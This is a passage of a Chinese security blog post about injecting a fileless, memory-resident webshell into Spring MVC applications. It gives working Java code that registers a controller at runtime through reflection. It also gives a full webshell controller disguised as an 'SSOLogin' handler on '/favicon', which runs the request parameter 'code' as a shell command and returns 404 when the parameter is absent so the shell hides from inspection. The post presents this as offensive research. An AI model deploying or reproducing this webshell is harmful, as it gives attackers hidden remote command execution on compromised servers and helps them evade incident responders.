<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">detectHandlerMethods</span><span class="params">(Object handler)</span> </span>&#123;</span><br><span class="line">	Class&lt;?&gt; handlerType = handler <span class="keyword">instanceof</span> String ? <span class="keyword">this</span>.getApplicationContext().getType((String)handler) : handler.getClass();</span><br><span class="line">	<span class="keyword">final</span> Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);</span><br><span class="line">	Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, <span class="keyword">new</span> MethodFilter() &#123;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">matches</span><span class="params">(Method method)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> AbstractHandlerMethodMapping.<span class="keyword">this</span>.getMappingForMethod(method, userType) != <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">	Iterator var6 = methods.iterator();</span><br><span class="line">	<span class="keyword">while</span>(var6.hasNext()) &#123;</span><br><span class="line">		Method method = (Method)var6.next();</span><br><span class="line">		T mapping = <span class="keyword">this</span>.getMappingForMethod(method, userType);</span><br><span class="line">		<span class="keyword">this</span>.registerHandlerMethod(handler, method, mapping);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>该方法仅接受<code>handler</code>参数，同样可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 并注册 <code>controller</code> 的实例 <code>bean</code>。</p>
<p>示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.getBeanFactory().registerSingleton(<span class="string">"dynamicController"</span>, Class.forName(<span class="string">"me.landgrey.SSOLogin"</span>).newInstance());</span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod("detectHandlerMethods", Object.class);</span><br><span class="line">m1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">m1.invoke(requestMappingHandlerMapping, <span class="string">"dynamicController"</span>);</span><br></pre></td></tr></table></figure>



<h3 id="3-controller-中的-Webshell-逻辑"><a href="#3-controller-中的-Webshell-逻辑" class="headerlink" title="3. controller 中的 Webshell 逻辑"></a>3. controller 中的 Webshell 逻辑</h3><p>在使用 <code>registerMapping</code> 动态注册 <code>controller</code> 时，不需要强制使用 <code>@RequestMapping</code>  注解定义 URL 地址和 HTTP 方法，其余两种手动注册 <code>controller</code> 的方法都必须要在 <code>controller</code> 中使用<code>@RequestMapping</code>  注解 。</p>
<p>除此之外，将 Webshell 的代码逻辑写在主要的 <code>Controller</code> 方法中即可。</p>
<p>下面提供一个简单的用来执行命令回显的 Webshell 代码示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> me.landgrey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SSOLogin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/favicon"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String arg0 = request.getParameter(<span class="string">"code"</span>);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                String o = <span class="string">""</span>;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"win"</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, arg0&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> java.lang.ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = <span class="keyword">new</span> java.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码比较简单，达到的效果是，当请求没有携带指定的参数(<code>code</code>)时，返回 404 错误，当没有经验的人员检查时，因为 Webshell 仅存在于内存中，直接访问又是 404 状态码，所以很可能会认为 Webshell 不存在或者没有异常了。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetpgdjpxj30q70a63zc.jpg" alt="response-01"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetpk3tjsj30qi08h3z7.jpg" alt="response-02"></p>
<h2 id="五-注意事项"><a href="#五-注意事项" class="headerlink" title="五. 注意事项"></a>五. 注意事项</h2><h3 id="不同的映射处理器"><a href="#不同的映射处理器" class="headerlink" title="不同的映射处理器"></a>不同的映射处理器</h3><p>如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 <code>RequestMappingHandlerMapping</code> 实例的 <code>bean</code>，但会存在 <code>DefaultAnnotationHandlerMapping</code> 的实例 <code>bean</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping"</span> /&gt;</span><br><span class="line">&lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">"org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter"</span> /&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Root-Context-与-Child-Context"><a href="#Root-Context-与-Child-Context" class="headerlink" title="Root Context 与 Child Context"></a>Root Context 与 Child Context</h3><p>上文展示的四种获得当前代码运行时的上下文环境的方法中，推荐使用后面两种方法获得 <code>Child WebApplicationContext</code>。</p>
<p>这是因为：根据习惯，在很多应用配置中注册<code>Controller</code> 的 <code>component-scan</code> 组件都配置在类似的 <code>dispatcherServlet-servlet.xml</code> 中，而不是全局配置文件 <code>applicationContext.xml</code> 中。</p>
<p>这样就导致 <code>RequestMappingHandlerMapping</code> 的实例 <code>bean</code> 只存在于 <code>Child WebApplicationContext</code> 环境中，而不是 <code>Root WebApplicationContext</code> 中。上文也提到过，<code>Root Context</code>无法访问<code>Child Context</code>中定义的 <code>bean</code>，所以可能会导致 <code>Root WebApplicationContext</code> 获得不了 <code>RequestMappingHandlerMapping</code> 的实例 <code>bean</code> 的情况。</p>
<p>另外，在有些Spring 应用逻辑比较简单的情况下，可能没有配置 <code>ContextLoaderListener</code> 、也没有类似 <code>applicationContext.xml</code> 的全局配置文件，只有简单的 <code>servlet</code> 配置文件，这时候通过前两种方法是获取不到<code>Root WebApplicationContext</code>的。</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>既然是通过执行 java 代码内存注入 webshell，那么一般需要通过 Spring 相关的<strong>代码执行漏洞</strong>才可以利用，例如较为常见的 Java 反序列漏洞、普通的 JSP 文件 Webshell 转换成无文件 Webshell等。</p>
<h2 id="六-演示"><a href="#六-演示" class="headerlink" title="六. 演示"></a>六. 演示</h2><p>本文技术的具体实现已集成到实验室内部的 Webshell 管理工具中，下面的动态图片演示了在 <code>SpringMvc</code> 环境中向内存注入一个自定义 URL 的 Webshell 操作。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetptstwxg31dk0ogx6s.gif" alt="video"></p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://lfvepclr.gitbooks.io/spring-framework-5-doc-cn/" target="_blank" rel="noopener">Spring Framework 5 中文文档</a></p>
<p><a href="https://www.cnblogs.com/zhangfengxian/p/11192054.html" target="_blank" rel="noopener">Spring源码阅读-ApplicationContext体系结构分析</a></p>
<p><a href="https://howtodoinjava.com/spring-mvc/contextloaderlistener-vs-dispatcherservlet/" target="_blank" rel="noopener">contextloaderlistener-vs-dispatcherservlet</a></p>
<p><a href="https://blog.csdn.net/sadfishsc/article/details/51027873" target="_blank" rel="noopener">DispatcherServlet与ContextLoaderListener的对比</a></p>
<p><a href="https://blog.csdn.net/GAMEloft9/article/details/81625348" target="_blank" rel="noopener">Spring MVC手动注册requestMapping</a></p>
<p><a href="https://bbs.csdn.net/topics/392073765" target="_blank" rel="noopener">动态注册bean后手动注册controller</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
</search>
